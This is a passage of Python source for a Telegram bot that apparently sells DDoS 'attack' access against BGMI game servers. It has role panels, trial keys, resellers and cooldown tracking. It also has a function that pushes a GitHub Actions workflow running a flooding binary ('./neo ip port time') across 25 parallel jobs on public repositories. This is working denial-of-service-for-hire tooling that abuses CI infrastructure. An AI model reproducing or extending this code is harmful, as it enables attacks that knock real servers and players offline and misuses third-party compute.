            "╔════════════════════════════════╗\n"
            "║  ⚠️  ɪɴᴠᴀʟɪᴅ ɪᴘ             ║\n"
            "╚════════════════════════════════╝\n"
            "┌────────────────────────────────┐\n"
            "│  ɪᴘꜱ ꜱᴛᴀʀᴛɪɴɢ ᴡɪᴛʜ '15' ᴏʀ  │\n"
            "│  '96' ᴀʀᴇ ɴᴏᴛ ᴀʟʟᴏᴡᴇᴅ.       │\n"
            "└────────────────────────────────┘"
        )
    else:
        return "BGMI FLOOD", "ɢᴀᴍᴇ"


def is_valid_ip(ip):
    """Validate IP address"""
    
    try:
        addr = ipaddress.ip_address(ip.strip())
        return addr.version == 4 and addr.is_global
    except ValueError:
        return False

def start_attack(ip, port, time_val, user_id, method):
    global current_attack
    current_attack = {
        "ip": ip,
        "port": port,
        "time": time_val,
        "user_id": user_id,
        "method": method,
        "start_time": time.time(),
        "estimated_end_time": time.time() + int(time_val)
    }
    save_attack_state()

    user_id_str = str(user_id)
    user_attack_counts[user_id_str] = user_attack_counts.get(user_id_str, 0) + 1
    save_user_attack_counts(user_attack_counts)

def finish_attack():
    global current_attack, cooldown_until
    current_attack = None
    cooldown_until = time.time() + COOLDOWN_DURATION
    save_attack_state()

def stop_attack():
    global current_attack, cooldown_until
    current_attack = None
    cooldown_until = time.time() + COOLDOWN_DURATION
    save_attack_state()

def get_attack_status():
    global current_attack, cooldown_until

    if current_attack is not None:
        current_time = time.time()
        elapsed = int(current_time - current_attack['start_time'])
        remaining = max(0, int(current_attack['estimated_end_time'] - current_time))

        return {
            "status": "running",
            "attack": current_attack,
            "elapsed": elapsed,
            "remaining": remaining
        }

    current_time = time.time()
    if current_time < cooldown_until:
        remaining_cooldown = int(cooldown_until - current_time)
        return {
            "status": "cooldown",
            "remaining_cooldown": remaining_cooldown
        }

    return {"status": "ready"}


def generate_trial_key(hours):
    key = f"TRL-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}"
    expiry = time.time() + (hours * 3600)

    trial_keys[key] = {
        "hours": hours,
        "expiry": expiry,
        "used": False,
        "used_by": None,
        "created_at": time.time(),
        "created_by": "system"
    }
    save_trial_keys(trial_keys)

    return key

def redeem_trial_key(key, user_id):
    user_id_str = str(user_id)

    if key not in trial_keys:
        return False, "Invalid key"

    key_data = trial_keys[key]

    if key_data["used"]:
        return False, "Key already used"

    if time.time() > key_data["expiry"]:
        return False, "Key expired"

    key_data["used"] = True
    key_data["used_by"] = user_id_str
    key_data["used_at"] = time.time()
    trial_keys[key] = key_data
    save_trial_keys(trial_keys)

    expiry = time.time() + (key_data["hours"] * 3600)
    approved_users[user_id_str] = {
        "username": f"user_{user_id}",
        "added_by": "trial_key",
        "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
        "expiry": expiry,
        "days": key_data["hours"] / 24,
        "trial": True
    }
    save_approved_users(approved_users)

    return True, f"✅ Trial access activated for {key_data['hours']} hours!"


def create_repository(token, repo_name="flashcrack-tg"):
    try:
        # ✅ Naya PyGithub tarika (deprecation warning fix)
        g = Github(auth=Auth.Token(token))
        user = g.get_user()

        try:
            repo = user.get_repo(repo_name)
            return repo, False
        except GithubException:
            repo = user.create_repo(
                repo_name,
                description="BRUH ITS ME FLASH",
                private=False,
                auto_init=False
            )
            return repo, True
    except Exception as e:
        raise Exception(f"Failed to create repository: {e}")

def update_yml_file(token, repo_name, ip, port, time_val, method):
    yml_content = f"""name: flash-tg fucker
on: [push]

jobs:
  attack:
    runs-on: ubuntu-22.04
    strategy:
      matrix:
        n: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25]
    steps:
      - uses: actions/checkout@v4
      - run: chmod +x neo
      - run: ./neo {ip} {port} {time_val}  #{method}
"""

    try:
        # ✅ DeprecationWarning fix
        g = Github(auth=Auth.Token(token))
        repo = g.get_repo(repo_name)
        try:
            file_content = repo.get_contents(YML_FILE_PATH)
            repo.update_file(YML_FILE_PATH, f"Update {method}", yml_content, file_content.sha)
        except GithubException:
            repo.create_file(YML_FILE_PATH, f"Create {method}", yml_content)
        return True
    except Exception as e:
        logger.error(f"Error: {e}")
        return False

def instant_stop_all_jobs(token, repo_name):
    try:
        # ✅ DeprecationWarning fix
        g = Github(auth=Auth.Token(token))
        repo = g.get_repo(repo_name)

        running_statuses = ['queued', 'in_progress', 'pending']
        total_cancelled = 0

        for status in running_statuses:
            try:
                workflows = repo.get_workflow_runs(status=status)
                for workflow in workflows:
                    try:
                        workflow.cancel()
                        total_cancelled += 1
                        logger.info(f"✅ INSTANT STOP: Cancelled {status} workflow {workflow.id} for {repo_name}")
                    except Exception as e:
                        logger.error(f"❌ Error cancelling workflow {workflow.id}: {e}")
            except Exception as e:
                logger.error(f"❌ Error getting {status} workflows: {e}")

        return total_cancelled

    except Exception as e:
        logger.error(f"❌ Error accessing {repo_name}: {e}")
        return 0



def get_main_keyboard(user_id):
    """Generate main keyboard based on user role"""
    keyboard = []

    # Row 1: Attack & Stop Attack
    keyboard.append([
        kbtn("⚔ 𝘼𝙏𝙏𝘼𝘾𝙆", style="success"),
        kbtn("✖ 𝙎𝙏𝙊𝙋 𝘼𝙏𝙏𝘼𝘾𝙆", style="danger"),
    ])

    # Row 2: Auto Panel (owner) + IP Panel
    if is_owner(user_id):
        keyboard.append([
            kbtn("💀 𝘼𝙐𝙏𝙊 𝙋𝘼𝙉𝙀𝙇 💀", style="success"),
            kbtn("📡 𝙄𝙋 𝙋𝘼𝙉𝙀𝙇", style="primary"),
        ])
    else:
        keyboard.append([
            kbtn("📡 𝙄𝙋 𝙋𝘼𝙉𝙀𝙇", style="primary"),
        ])

    # Row 3: Check Status & My Access
    keyboard.append([
        kbtn("▣ 𝘾𝙃𝙀𝘾𝙆 𝙎𝙏𝘼𝙏𝙐𝙎", style="primary"),
        kbtn("🔐 𝙈𝙔 𝘼𝘾𝘾𝙀𝙎𝙎", style="primary"),
    ])

    # Row 4: User Mgmt & Bot Settings (owner + admin)
    if is_owner(user_id) or is_admin(user_id):
        keyboard.append([
            kbtn("👥 𝙐𝙎𝙀𝙍 𝙈𝘼𝙉𝘼𝙂𝙀𝙈𝙀𝙉𝙏", style="primary"),
            kbtn("⚙️ 𝘽𝙊𝙏 𝙎𝙀𝙏𝙏𝙄𝙉𝙂𝙎", style="primary"),
        ])

    # Row 5: Owner Panel & Token Mgmt (owner only)
    if is_owner(user_id):
        keyboard.append([
            kbtn("👑 𝙊𝙒𝙉𝙀𝙍 𝙋𝘼𝙉𝙀𝙇", style="success"),
            kbtn("🔑 𝙏𝙊𝙆𝙀𝙉 𝙈𝘼𝙉𝘼𝙂𝙀𝙈𝙀𝙉𝙏", style="success"),
        ])

    # Row 6: Help
    keyboard.append([kbtn("❓ 𝙃𝙀𝙇𝙋", style="primary")])

    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)


def get_user_management_keyboard():
    """User management keyboard"""
    keyboard = [
        [
            kbtn("✔ 𝘼𝘿𝘿 𝙐𝙎𝙀𝙍", style="success"),
            kbtn("✘ 𝙍𝙀𝙈𝙊𝙑𝙀 𝙐𝙎𝙀𝙍", style="danger"),
        ],
        [
            kbtn("▣ 𝙐𝙎𝙀𝙍𝙎 𝙇𝙄𝙎𝙏", style="primary"),
            kbtn("⏳ 𝙋𝙀𝙉𝘿𝙄𝙉𝙂 𝙍𝙀𝙌𝙐𝙀𝙎𝙏𝙎", style="primary"),
        ],
        [
            kbtn("🔑 𝙂𝙀𝙉𝙀𝙍𝘼𝙏𝙀 𝙏𝙍𝙄𝘼𝙇", style="success"),
            kbtn("💰 𝙋𝙍𝙄𝘾𝙀 𝙇𝙄𝙎𝙏", style="primary"),
        ],
        [kbtn("◀ 𝘽𝘼𝘾𝙆 𝙏𝙊 𝙈𝙀𝙉𝙐", style="danger")],
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)


def get_owner_panel_keyboard():
    """Owner panel keyboard"""
    keyboard = [
        [
            kbtn("👑 𝘼𝘿𝘿 𝙊𝙒𝙉𝙀𝙍", style="success"),
            kbtn("✖ 𝙍𝙀𝙈𝙊𝙑𝙀 𝙊𝙒𝙉𝙀𝙍", style="danger"),
        ],
        [
            kbtn("💎 𝘼𝘿𝘿 𝙍𝙀𝙎𝙀𝙇𝙇𝙀𝙍", style="success"),
            kbtn("✖ 𝙍𝙀𝙈𝙊𝙑𝙀 𝙍𝙀𝙎𝙀𝙇𝙇𝙀𝙍", style="danger"),
        ],
        [
            kbtn("▣ 𝙊𝙒𝙉𝙀𝙍𝙎 𝙇𝙄𝙎𝙏", style="primary"),
            kbtn("💎 𝙍𝙀𝙎𝙀𝙇𝙇𝙀𝙍𝙎 𝙇𝙄𝙎𝙏", style="primary"),
        ],
        [
            kbtn("📢 𝘽𝙍𝙊𝘼𝘿𝘾𝘼𝙎𝙏", style="primary"),
            kbtn("📤 𝙐𝙋𝙇𝙊𝘼𝘿 𝘽𝙄𝙉𝘼𝙍𝙔", style="primary"),
        ],
        [kbtn("◀ 𝘽𝘼𝘾𝙆 𝙏𝙊 𝙈𝙀𝙉𝙐", style="danger")],
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)


def get_bot_settings_keyboard():
    """Bot settings keyboard"""
    keyboard = [
        [
            kbtn("🔧 𝙏𝙊𝙂𝙂𝙇𝙀 𝙈𝘼𝙄𝙉𝙏𝙀𝙉𝘼𝙉𝘾𝙀", style="danger"),
            kbtn("⏱️ 𝙎𝙀𝙏 𝘾𝙊𝙊𝙇𝘿𝙊𝙒𝙉", style="primary"),
        ],
        [
            kbtn("🎯 𝙎𝙀𝙏 𝙈𝘼𝙓 𝘼𝙏𝙏𝘼𝘾𝙆𝙎", style="primary"),
            kbtn("▣ 𝘼𝘿𝙈𝙄𝙉 𝙇𝙄𝙎𝙏", style="primary"),
        ],
        [kbtn("◀ 𝘽𝘼𝘾𝙆 𝙏𝙊 𝙈𝙀𝙉𝙐", style="danger")],
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)


def get_token_management_keyboard():
    """Token management keyboard"""
    keyboard = [
        [
            kbtn("✔ 𝘼𝘿𝘿 𝙏𝙊𝙆𝙀𝙉", style="success"),
            kbtn("▣ 𝙇𝙄𝙎𝙏 𝙏𝙊𝙆𝙀𝙉𝙎", style="primary"),
        ],
        [
            kbtn("✖ 𝙍𝙀𝙈𝙊𝙑𝙀 𝙏𝙊𝙆𝙀𝙉", style="danger"),
            kbtn("🧹 𝙍𝙀𝙈𝙊𝙑𝙀 𝙀𝙓𝙋𝙄𝙍𝙀𝘿", style="danger"),
        ],
        [kbtn("◀ 𝘽𝘼𝘾𝙆 𝙏𝙊 𝙈𝙀𝙉𝙐", style="danger")],
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)


# ─── IP PANEL keyboard ───
def get_ip_panel_keyboard():
    """IP Panel keyboard"""
    keyboard = [
        [
            kbtn("➕ 𝘼𝘿𝘿 𝙎𝙀𝙎𝙎𝙄𝙊𝙉", style="success"),
            kbtn("📁 𝙎𝙀𝙎𝙎𝙄𝙊𝙉𝙎 𝙇𝙄𝙎𝙏", style="primary"),
        ],
        [
            kbtn("🌐 𝙂𝙀𝙏 𝙄𝙋", style="success"),
            kbtn("🩺 𝙃𝙀𝘼𝙇𝙏𝙃 𝘾𝙃𝙀𝘾𝙆", style="primary"),
        ],
        [
            kbtn("❌ 𝙍𝙀𝙈𝙊𝙑𝙀 𝙎𝙀𝙎𝙎𝙄𝙊𝙉", style="danger"),
        ],
        [kbtn("◀ 𝘽𝘼𝘾𝙆 𝙏𝙊 𝙈𝙀𝙉𝙐", style="danger")],
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)


# ─── AUTO PANEL keyboard ───
def get_auto_attack_keyboard():
    """Auto Panel control keyboard"""
    keyboard = [
        [
            kbtn("➕ 𝘼𝘿𝘿 𝙏𝘼𝙍𝙂𝙀𝙏", style="success"),
            kbtn("⏱️ 𝘼𝘿𝘿 𝙏𝙄𝙈𝙀𝙍", style="success"),
        ],
        [
            kbtn("📋 𝙏𝘼𝙍𝙂𝙀𝙏 𝙇𝙄𝙎𝙏", style="primary"),
        ],
        [
            kbtn("🛑 𝙋𝘼𝙐𝙎𝙀 𝙏𝘼𝙍𝙂𝙀𝙏", style="danger"),
            kbtn("▶ 𝙍𝙀𝙎𝙐𝙈𝙀 𝙏𝘼𝙍𝙂𝙀𝙏", style="success"),
        ],
        [
            kbtn("🔄 𝙍𝙀𝙎𝙀𝙏 𝘽𝘼𝙉𝙉𝙀𝘿", style="primary"),
            kbtn("❌ 𝙍𝙀𝙈𝙊𝙑𝙀 𝙏𝘼𝙍𝙂𝙀𝙏", style="danger"),
        ],
        [kbtn("◀ 𝘽𝘼𝘾𝙆 𝙏𝙊 𝙈𝙀𝙉𝙐", style="danger")],
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)


def get_cancel_keyboard():
    """Cancel keyboard"""
    keyboard = [[kbtn("✖ 𝘾𝘼𝙉𝘾𝙀𝙇", style="danger")]]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

async def handle_button_press(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text

    # Navigation
    if text == "◀ 𝘽𝘼𝘾𝙆 𝙏𝙊 𝙈𝙀𝙉𝙐":
        await show_main_menu(update, user_id)

    # ─── Main Menu ───
    elif text == "⚔ 𝘼𝙏𝙏𝘼𝘾𝙆":
        await launch_attack_start(update, context, user_id)
    elif text == "▣ 𝘾𝙃𝙀𝘾𝙆 𝙎𝙏𝘼𝙏𝙐𝙎":
        await check_status(update, user_id)
    elif text == "✖ 𝙎𝙏𝙊𝙋 𝘼𝙏𝙏𝘼𝘾𝙆":
        await stop_attack_handler(update, context, user_id)
    elif text == "🔐 𝙈𝙔 𝘼𝘾𝘾𝙀𝙎𝙎":
        await my_access(update, user_id)

    # ─── AUTO PANEL 💀 ───
    elif text == "💀 𝘼𝙐𝙏𝙊 𝙋𝘼𝙉𝙀𝙇 💀":
        await show_auto_attack_panel(update, user_id)
    elif text == "➕ 𝘼𝘿𝘿 𝙏𝘼𝙍𝙂𝙀𝙏":
        await ip_auto_attack_start(update, user_id)
    elif text == "⏱️ 𝘼𝘿𝘿 𝙏𝙄𝙈𝙀𝙍":
        await ip_auto_attack_timer_start(update, user_id)
    elif text == "📋 𝙏𝘼𝙍𝙂𝙀𝙏 𝙇𝙄𝙎𝙏":
        await ip_auto_attack_list(update, user_id)
    elif text == "🛑 𝙋𝘼𝙐𝙎𝙀 𝙏𝘼𝙍𝙂𝙀𝙏":
        await ip_auto_attack_stop_start(update, user_id)
    elif text == "▶ 𝙍𝙀𝙎𝙐𝙈𝙀 𝙏𝘼𝙍𝙂𝙀𝙏":
        await ip_auto_attack_resume_start(update, user_id)
    elif text == "🔄 𝙍𝙀𝙎𝙀𝙏 𝘽𝘼𝙉𝙉𝙀𝘿":
        await ip_auto_attack_reset_banned(update, user_id)
    elif text == "❌ 𝙍𝙀𝙈𝙊𝙑𝙀 𝙏𝘼𝙍𝙂𝙀𝙏":
        await ip_auto_attack_remove_start(update, user_id)

    # ─── User Management ───
    elif text == "👥 𝙐𝙎𝙀𝙍 𝙈𝘼𝙉𝘼𝙂𝙀𝙈𝙀𝙉𝙏":
        await show_user_management(update, user_id)
    elif text == "✔ 𝘼𝘿𝘿 𝙐𝙎𝙀𝙍":
        await add_user_start(update, user_id)
    elif text == "✘ 𝙍𝙀𝙈𝙊𝙑𝙀 𝙐𝙎𝙀𝙍":
        await remove_user_start(update, user_id)
    elif text == "▣ 𝙐𝙎𝙀𝙍𝙎 𝙇𝙄𝙎𝙏":
        await users_list(update, user_id)
    elif text == "⏳ 𝙋𝙀𝙉𝘿𝙄𝙉𝙂 𝙍𝙀𝙌𝙐𝙀𝙎𝙏𝙎":
        await pending_requests(update, user_id)
    elif text == "🔑 𝙂𝙀𝙉𝙀𝙍𝘼𝙏𝙀 𝙏𝙍𝙄𝘼𝙇":
        await gen_trial_key_start(update, user_id)
    elif text == "💰 𝙋𝙍𝙄𝘾𝙀 𝙇𝙄𝙎𝙏":
        await price_list(update)

    # ─── Bot Settings ───
    elif text == "⚙️ 𝘽𝙊𝙏 𝙎𝙀𝙏𝙏𝙄𝙉𝙂𝙎":
        await show_bot_settings(update, user_id)
    elif text == "🔧 𝙏𝙊𝙂𝙂𝙇𝙀 𝙈𝘼𝙄𝙉𝙏𝙀𝙉𝘼𝙉𝘾𝙀":
        await toggle_maintenance(update, user_id)
    elif text == "⏱️ 𝙎𝙀𝙏 𝘾𝙊𝙊𝙇𝘿𝙊𝙒𝙉":
        await set_cooldown_start(update, user_id)
    elif text == "🎯 𝙎𝙀𝙏 𝙈𝘼𝙓 𝘼𝙏𝙏𝘼𝘾𝙆𝙎":
        await set_max_attacks_start(update, user_id)
    elif text == "▣ 𝘼𝘿𝙈𝙄𝙉 𝙇𝙄𝙎𝙏":
        await admin_list(update, user_id)

    # ─── Owner Panel ───
    elif text == "👑 𝙊𝙒𝙉𝙀𝙍 𝙋𝘼𝙉𝙀𝙇":
        await show_owner_panel(update, user_id)
    elif text == "👑 𝘼𝘿𝘿 𝙊𝙒𝙉𝙀𝙍":
        await add_owner_start(update, user_id)
    elif text == "✖ 𝙍𝙀𝙈𝙊𝙑𝙀 𝙊𝙒𝙉𝙀𝙍":
        await remove_owner_start(update, user_id)
    elif text == "💎 𝘼𝘿𝘿 𝙍𝙀𝙎𝙀𝙇𝙇𝙀𝙍":
        await add_reseller_start(update, user_id)
    elif text == "✖ 𝙍𝙀𝙈𝙊𝙑𝙀 𝙍𝙀𝙎𝙀𝙇𝙇𝙀𝙍":
        await remove_reseller_start(update, user_id)
    elif text == "▣ 𝙊𝙒𝙉𝙀𝙍𝙎 𝙇𝙄𝙎𝙏":
        await owner_list(update, user_id)
    elif text == "💎 𝙍𝙀𝙎𝙀𝙇𝙇𝙀𝙍𝙎 𝙇𝙄𝙎𝙏":
        await reseller_list(update, user_id)
    elif text == "📢 𝘽𝙍𝙊𝘼𝘿𝘾𝘼𝙎𝙏":
        await broadcast_start(update, user_id)
    elif text == "📤 𝙐𝙋𝙇𝙊𝘼𝘿 𝘽𝙄𝙉𝘼𝙍𝙔":
        await upload_binary_start(update, user_id)

    # ─── IP PANEL ───
    elif text == "📡 𝙄𝙋 𝙋𝘼𝙉𝙀𝙇":
        await show_ip_panel(update, user_id)
    elif text == "➕ 𝘼𝘿𝘿 𝙎𝙀𝙎𝙎𝙄𝙊𝙉":
        await ip_add_session_start(update, user_id)
    elif text == "📁 𝙎𝙀𝙎𝙎𝙄𝙊𝙉𝙎 𝙇𝙄𝙎𝙏":
        await ip_sessions_list(update, user_id)
    elif text == "🌐 𝙂𝙀𝙏 𝙄𝙋":
        await ip_get_ip_start(update, user_id)
    elif text == "🩺 𝙃𝙀𝘼𝙇𝙏𝙃 𝘾𝙃𝙀𝘾𝙆":
        await ip_health_check(update, user_id)
    elif text == "❌ 𝙍𝙀𝙈𝙊𝙑𝙀 𝙎𝙀𝙎𝙎𝙄𝙊𝙉":
        await ip_remove_session_start(update, user_id)

    # ─── Token Management ───
    elif text == "🔑 𝙏𝙊𝙆𝙀𝙉 𝙈𝘼𝙉𝘼𝙂𝙀𝙈𝙀𝙉𝙏":
        await show_token_management(update, user_id)
    elif text == "✔ 𝘼𝘿𝘿 𝙏𝙊𝙆𝙀𝙉":
        await add_token_start(update, user_id)
    elif text == "▣ 𝙇𝙄𝙎𝙏 𝙏𝙊𝙆𝙀𝙉𝙎":
        await list_tokens(update, user_id)
    elif text == "✖ 𝙍𝙀𝙈𝙊𝙑𝙀 𝙏𝙊𝙆𝙀𝙉":
        await remove_token_start(update, user_id)
    elif text == "🧹 𝙍𝙀𝙈𝙊𝙑𝙀 𝙀𝙓𝙋𝙄𝙍𝙀𝘿":
        await remove_expired_tokens(update, user_id)

    # ─── Help ───
    elif text == "❓ 𝙃𝙀𝙇𝙋":
        await help_handler(update, user_id)

    # ─── Cancel ───
    elif text == "✖ 𝘾𝘼𝙉𝘾𝙀𝙇":
        if user_id in temp_data:
            current_step = temp_data[user_id].get("step", "")

            # IP PANEL: cleanup temp pyrogram client on cancel
            if current_step in ("ip_add_session_phone", "ip_add_session_otp", "ip_add_session_2fa"):
                sname = temp_data[user_id].get("session_name")
                temp_key = f"temp_{sname}" if sname else None
                if temp_key and temp_key in ip_clients:
                    try:
                        await ip_clients[temp_key].disconnect()
                    except Exception as e:
                        logger.warning(f"cancel cleanup disconnect failed: {e}")
                    ip_clients.pop(temp_key, None)

                if sname:
                    sess_file = os.path.join(IP_SESSIONS_DIR, f"{sname}.session")
                    try:
                        if os.path.exists(sess_file):
                            os.remove(sess_file)
                    except Exception as e:
                        logger.warning(f"cancel cleanup session file failed: {e}")

            del temp_data[user_id]

        reply_markup = get_main_keyboard(user_id)
        await update.message.reply_text(
            "❌ **𝐎𝐏𝐄𝐑𝐀𝐓𝐈𝐎𝐍 𝐂𝐀𝐍𝐂𝐄𝐋𝐋𝐄𝐃**",
            reply_markup=reply_markup
        )

    else:
        await handle_text_input(update, context, user_id, text)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global _owner_dm_url_cache
    user_id = update.effective_user.id

    # ─── Maintenance check ───
    if MAINTENANCE_MODE and not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text(
            "╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮\n"
            "   🔧  𝐌𝐀𝐈𝐍𝐓𝐄𝐍𝐀𝐍𝐂𝐄 𝐌𝐎𝐃𝐄\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯\n"
            "  Bot is under maintenance.\n"
            "  Please wait until it's back. ⏳"
        )
        return

    # ═══════════════════════════════════════════════════════════
    #   👑  Resolve Owner DM Link (with "hello" prefilled)
    # ═══════════════════════════════════════════════════════════
    owner_dm_url = _owner_dm_url_cache  # use cache if available

    if not owner_dm_url:
        primary_owner_id = None
        for oid, info in owners.items():
            if info.get("is_primary", False):
                primary_owner_id = oid
                break
        if not primary_owner_id and owners:
            primary_owner_id = list(owners.keys())[0]

        if primary_owner_id:
            try:
                owner_chat = await context.bot.get_chat(int(primary_owner_id))
                if owner_chat.username:
                    owner_dm_url = f"https://t.me/{owner_chat.username}?text=hello"
                else:
                    owner_dm_url = f"tg://user?id={primary_owner_id}"
            except Exception:
                owner_dm_url = f"tg://user?id={primary_owner_id}"

        _owner_dm_url_cache = owner_dm_url  # save for callback use

    contact_kb = None
    if owner_dm_url:
        contact_kb = InlineKeyboardMarkup([
            [cbtn("👑  ᴄᴏɴᴛᴀᴄᴛ ᴏᴡɴᴇʀ  💬", url=owner_dm_url, style="success")]
        ])

    # ═══════════════════════════════════════════════════════════
    #   🚫  Not Authorized → Request Access
    # ═══════════════════════════════════════════════════════════
    if not can_user_attack(user_id):
        user_exists = any(str(u['user_id']) == str(user_id) for u in pending_users)
        if not user_exists:
            pending_users.append({
                "user_id": user_id,
                "username": update.effective_user.username or f"user_{user_id}",
                "request_date": time.strftime("%Y-%m-%d %H:%M:%S")
            })
            save_pending_users(pending_users)

            for owner_id in owners.keys():
                try:
                    await context.bot.send_message(
                        chat_id=int(owner_id),
                        text=(
                            "╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮\n"
                            "   📥  𝐍𝐄𝐖 𝐀𝐂𝐂𝐄𝐒𝐒 𝐑𝐄𝐐𝐔𝐄𝐒𝐓\n"
                            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯\n"
                            f"👤 ᴜꜱᴇʀ: @{update.effective_user.username or 'No username'}\n"
                            f"🆔 ɪᴅ:  `{user_id}`\n"
                            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                            "⚡ ᴀᴘᴘʀᴏᴠᴇ ᴠɪᴀ ᴜꜱᴇʀ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ"
                        )
                    )
                except Exception:
                    pass

        # ─── Build multi-button inline keyboard ───
        access_buttons = []

        if owner_dm_url:
            access_buttons.append([
                cbtn("👑  ᴄᴏɴᴛᴀᴄᴛ ᴏᴡɴᴇʀ  💬", url=owner_dm_url, style="success")
            ])

        access_buttons.append([
            cbtn("🔄  ᴄʜᴇᴄᴋ ᴀᴘᴘʀᴏᴠᴀʟ", callback_data="recheck_access", style="primary")
        ])

        access_buttons.append([
            cbtn("💡  ʜᴏᴡ ᴛᴏ ɢᴇᴛ ᴀᴄᴄᴇꜱꜱ", callback_data="access_help_info", style="primary"),
        ])

        access_kb = InlineKeyboardMarkup(access_buttons)

        await update.message.reply_text(
            "╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮\n"
            "   📋  𝐀𝐂𝐂𝐄𝐒𝐒 𝐑𝐄𝐐𝐔𝐄𝐒𝐓\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯\n"
            "  ✅  ʀᴇǫᴜᴇꜱᴛ ꜱᴇɴᴛ ᴛᴏ ᴀᴅᴍɪɴ\n"
            "  ⏳  ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ ꜰᴏʀ ᴀᴘᴘʀᴏᴠᴀʟ\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🆔  **𝐘𝐨𝐮𝐫 𝐈𝐃:**  `{user_id}`\n\n"
            "💡  **𝐖𝐀𝐍𝐓 𝐀 𝐓𝐑𝐈𝐀𝐋?**\n"
            "   ᴀꜱᴋ ᴀᴅᴍɪɴ ꜰᴏʀ ᴀ ᴛʀɪᴀʟ ᴋᴇʏ ✨\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "  👇 ᴛᴀᴘ ʙᴇʟᴏᴡ 👇",
            reply_markup=access_kb
        )
        return

    # ═══════════════════════════════════════════════════════════
    #   👤  Role Detection
    # ═══════════════════════════════════════════════════════════
    if is_owner(user_id):
        user_role = "👑  𝐏𝐑𝐈𝐌𝐀𝐑𝐘 𝐎𝐖𝐍𝐄𝐑" if is_primary_owner(user_id) else "👑  𝐎𝐖𝐍𝐄𝐑"
    elif is_admin(user_id):
        user_role = "🛡️  𝐀𝐃𝐌𝐈𝐍"
    elif is_reseller(user_id):
        user_role = "💰  𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑"
    else:
        user_role = "👤  𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 𝐔𝐒𝐄𝐑"

    # ═══════════════════════════════════════════════════════════
    #   📊  Stats
    # ═══════════════════════════════════════════════════════════
    user_id_str = str(user_id)
    current_attacks = user_attack_counts.get(user_id_str, 0)
    remaining_attacks = MAX_ATTACKS - current_attacks

    attack_status = get_attack_status()
    status_text = ""

    if attack_status["status"] == "running":
        attack = attack_status["attack"]
        status_text = (
            "\n"
            f"  🔥 ᴛᴀʀɢᴇᴛ:   `{attack['ip']}:{attack['port']}`\n"
            f"  ⏳ ʀᴇᴍᴀɪɴɪɴɢ: `{attack_status['remaining']}s`\n"
        )
    elif attack_status["status"] == "cooldown":
        status_text = (
            "\n"
            f"  ⏳ ᴄᴏᴏʟᴅᴏᴡɴ: `{attack_status['remaining_cooldown']}s`\n"
        )

    status_icon = "🟢" if attack_status['status'] == 'ready' else "🔴"
    status_label = "𝐑𝐄𝐀𝐃𝐘" if attack_status['status'] == 'ready' else "𝐁𝐔𝐒𝐘"

    # ═══════════════════════════════════════════════════════════
    #   🎨  Stylish Main Menu Message
    # ═══════════════════════════════════════════════════════════
    message = (
        "╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮\n"
        "   🤖  𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐓𝐇𝐄 𝐁𝐎𝐓\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯\n"
        "\n"
        f"  {user_role}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"  🎯 ᴀᴛᴛᴀᴄᴋꜱ:  `{remaining_attacks} / {MAX_ATTACKS}`\n"
        f"  {status_icon} ꜱᴛᴀᴛᴜꜱ:   **{status_label}**\n"
        f"{status_text}"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "  💡 ᴛᴀᴘ ᴛʜᴇ ʙᴜᴛᴛᴏɴꜱ ʙᴇʟᴏᴡ\n"
        "     ᴛᴏ ɴᴀᴠɪɢᴀᴛᴇ ✨"
    )

    reply_markup = get_main_keyboard(user_id)
    await update.message.reply_text(message, reply_markup=reply_markup)

    # ─── Owner contact inline button (separate small message) ───
    if contact_kb:
        await update.message.reply_text(
            "╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮\n"
            "   💬  𝐍𝐄𝐄𝐃 𝐇𝐄𝐋𝐏?\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯\n"
            "  ᴛᴀᴘ ʙᴇʟᴏᴡ ᴛᴏ ᴄᴏɴᴛᴀᴄᴛ\n"
            "  ᴛʜᴇ ᴏᴡɴᴇʀ ᴅɪʀᴇᴄᴛʟʏ 👇",
            reply_markup=contact_kb
        )

async def show_main_menu(update: Update, user_id):
    """Display the main menu with user status and attack info"""
    if is_owner(user_id):
        user_role = "👑 ᴘʀɪᴍᴀʀʏ ᴏᴡɴᴇʀ" if is_primary_owner(user_id) else "👑 ᴏᴡɴᴇʀ"
    elif is_admin(user_id):
        user_role = "🛡️ ᴀᴅᴍɪɴ"
    elif is_reseller(user_id):
